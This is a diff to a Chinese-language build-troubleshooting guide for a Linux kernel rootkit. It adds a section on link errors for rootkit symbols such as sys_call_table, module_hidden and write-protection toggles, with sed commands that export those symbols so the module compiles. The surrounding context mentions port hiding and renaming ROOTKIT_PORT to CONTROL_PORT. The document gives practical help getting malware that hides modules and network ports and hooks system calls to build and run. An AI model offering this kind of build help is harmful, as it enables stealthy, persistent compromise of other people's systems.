@@ -124,7 +124,41 @@ port_hiding.c:89:50: error: 'ROOTKIT_PORT' undeclared
    - `ROOTKIT_PORT` → `CONTROL_PORT`
 3. 修正函数调用参数类型：`is_magic_port(ntohs(port))`
 
-## 8. 内核头文件未找到
+## 8. 模块链接错误 - 符号未定义
+
+**错误信息**:
+```
+ERROR: modpost: missing MODULE_LICENSE() in /root/rootkit/rootkit.o
+ERROR: modpost: "module_previous" [/root/rootkit/rootkit.ko] undefined!
+ERROR: modpost: "sys_call_table" [/root/rootkit/rootkit.ko] undefined!
+ERROR: modpost: "enable_write_protection" [/root/rootkit/rootkit.ko] undefined!
+ERROR: modpost: "disable_write_protection" [/root/rootkit/rootkit.ko] undefined!
+ERROR: modpost: "module_hidden" [/root/rootkit/rootkit.ko] undefined!
+```
+
+**原因**:
+- `module_previous`和`module_hidden`变量被声明为`static`，无法被其他模块访问
+- 缺少必要的`EXPORT_SYMBOL`声明
+- 模块许可证信息可能位置不正确
+
+**解决方案**:
+1. 将`static`变量改为全局变量
+2. 添加`EXPORT_SYMBOL`导出符号
+3. 确保`MODULE_LICENSE`等宏定义正确
+
+**修复命令**:
+```bash
+# 修改变量声明
+sed -i 's/static struct list_head \*module_previous;/struct list_head *module_previous;/' rootkit.c
+sed -i 's/static short module_hidden = 0;/short module_hidden = 0;/' rootkit.c
+
+# 添加符号导出
+sed -i '/EXPORT_SYMBOL(enable_write_protection);/a\
+EXPORT_SYMBOL(module_previous);\
+EXPORT_SYMBOL(module_hidden);' rootkit.c
+```
+
+## 9. 内核头文件未找到
 
 **错误信息**:
 ```
@@ -147,7 +181,7 @@ sudo dnf install kernel-devel kernel-headers
 sudo pacman -S linux-headers
 ```
 
-## 9. 编译器版本不匹配警告
+## 10. 编译器版本不匹配警告
 
 **警告信息**:
 ```
@@ -166,7 +200,7 @@ sudo apt install gcc-11  # 根据内核编译版本调整
 make EXTRA_CFLAGS="-w"
 ```
 
-## 10. 循环依赖警告
+## 11. 循环依赖警告
 
 **警告信息**:
 ```
